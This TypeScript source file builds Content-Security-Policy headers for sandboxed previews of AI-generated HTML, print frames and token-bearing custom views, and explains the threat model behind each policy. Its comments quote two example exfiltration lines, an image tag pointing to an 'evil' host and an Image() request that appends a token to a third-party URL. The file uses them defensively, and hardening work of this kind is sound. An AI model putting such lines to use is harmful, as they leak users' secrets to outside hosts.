// CSP whitelist applied to HTML files previewed in the Files
// explorer iframe. We ship a narrow list of trusted CDNs that the
// LLM commonly pulls from (Chart.js, D3, Tailwind, etc. via
// jsdelivr / unpkg / cdnjs) plus Google Fonts. Anything else —
// random `https://` origins, phone-home `fetch()` calls, etc. —
// is rejected.
//
// Widen by editing `HTML_PREVIEW_CSP_ALLOWED_CDNS` below. Keep the
// list audited — every entry is a potential supply-chain surface.

export const HTML_PREVIEW_CSP_ALLOWED_CDNS: readonly string[] = [
  "https://cdn.jsdelivr.net",
  "https://unpkg.com",
  "https://cdnjs.cloudflare.com",
  "https://fonts.googleapis.com",
  "https://fonts.gstatic.com",
  // Plotly's official CDN. The LLM defaults to this URL when it
  // includes a Sankey or other Plotly chart in presentHtml output —
  // Plotly's docs recommend it, so unconditioned LLM output ends up
  // pointing here. Also reachable through jsdelivr, but adding the
  // first-party CDN keeps historical artifacts (where the URL is
  // already baked into the file on disk) rendering correctly.
  "https://cdn.plot.ly",
];

/**
 * Build the CSP string. Split from the wrapper so tests can exercise
 * the policy without HTML-template noise.
 *
 * `origin`, when provided, replaces `'self'` in `img-src`. The preview
 * iframe is `sandbox="allow-scripts"` only, so its document has an
 * opaque origin: Safari/WebKit matches `'self'` against the (opaque)
 * origin tuple and rejects every same-origin image request. Chrome
 * matches `'self'` against the document URL and works either way. Pass
 * the explicit server origin from HTTP-header callers; leave it
 * undefined for the `srcdoc` fallback (where `'self'` is meaningless
 * either way and there are no same-origin refs to resolve).
 */
function buildCsp(connectSrc: string, imgSelf: string, cdns: readonly string[]): string {
  const cdnList = cdns.join(" ");
  return [
    "default-src 'none'",
    // LLM-authored HTML almost always uses inline <script> blocks
    // alongside the CDN load. No feasible path to avoid
    // 'unsafe-inline' without rewriting every output.
    `script-src 'unsafe-inline' ${cdnList}`,
    `style-src 'unsafe-inline' ${cdnList}`,
    `font-src ${cdnList}`,
    // Images: same-origin (workspace files via /api/files/raw), CDN
    // whitelist, plus data: and blob: for inline PNGs and dynamically-
    // generated charts. Wildcard is deliberately avoided — an attacker
    // who plants an <img src="https://evil/?leak="> in preview HTML
    // could exfiltrate data via image requests even with connect-src
    // blocked. Widen via HTML_PREVIEW_CSP_ALLOWED_CDNS if LLM output
    // legitimately needs more hosts.
    `img-src ${imgSelf} ${cdnList} data: blob:`,
    `connect-src ${connectSrc}`,
  ].join("; ");
}

export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  // Block XHR / fetch / WebSocket so previews can't phone home or
  // exfiltrate anything the inline scripts happen to compute.
  return buildCsp("'none'", origin ?? "'self'", cdns);
}

/**
 * CSP for a custom collection view (see plans/feat-collections-custom-views.md).
 *
 * Unlike the preview policy, a custom view is handed a **secret** — the scoped
 * capability token in `window.__MC_VIEW.token` — plus the collection's records.
 * That changes the threat model: ANY third-party resource destination becomes
 * an exfiltration channel, because the token/data can ride out in a request URL
 * (`new Image().src = "https://cdn.example/x?" + token`) and `connect-src` does
 * NOT govern script/style/font/img loads. So this policy allows **no
 * third-party hosts at all** (no CDN allowlist):
 *   - `script-src` / `style-src`: inline only.
 *   - `img-src` / `font-src`: same-origin + `data:` / `blob:` only — same-origin
 *     can only reach our own (loopback) server, never an attacker.
 *   - `connect-src`: the server origin only — the view fetches its data endpoint
 *     and nothing else.
 *
 * `origin` MUST be the explicit server origin: the sandboxed iframe has an
 * opaque origin, so `'self'` would never match (same reason the preview policy
 * substitutes the origin into `img-src`).
 */
export function buildCustomViewCsp(origin: string): string {
  return [
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    `img-src ${origin} data: blob:`,
    "font-src data:",
    `connect-src ${origin}`,
  ].join("; ");
}

/**
 * Build the CSP string for the print-mode hidden iframe (presentHtml's
 * printToPdf). Same policy as the preview header with the explicit
 * server origin substituted for `'self'` — see `buildHtmlPreviewCsp`
 * for why the substitution is required.
 */
export function buildPrintCspContent(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
  return buildHtmlPreviewCsp(origin, cdns);
}

const CSP_META_NONCE = ""; // reserved for future use (per-render nonce)

/**
 * Inject a `<meta http-equiv="Content-Security-Policy">` tag into the
 * HTML head. If the HTML has no `<head>`, wrap it as a full document
 * with a synthetic head so the meta tag is honoured regardless.
 *
 * Pure — doesn't touch the DOM. Safe to use from both client and
 * tests.
 */
export function wrapHtmlWithPreviewCsp(html: string): string {
  const csp = buildHtmlPreviewCsp();
  const meta = `<meta http-equiv="Content-Security-Policy" content="${csp}">`;
  if (/<head\b[^>]*>/i.test(html)) {
    return html.replace(/(<head\b[^>]*>)/i, `$1${meta}`);
  }
  // No <head> — treat as fragment and wrap it.
  return `<!DOCTYPE html><html><head>${meta}</head><body>${html}</body></html>${CSP_META_NONCE}`;
}
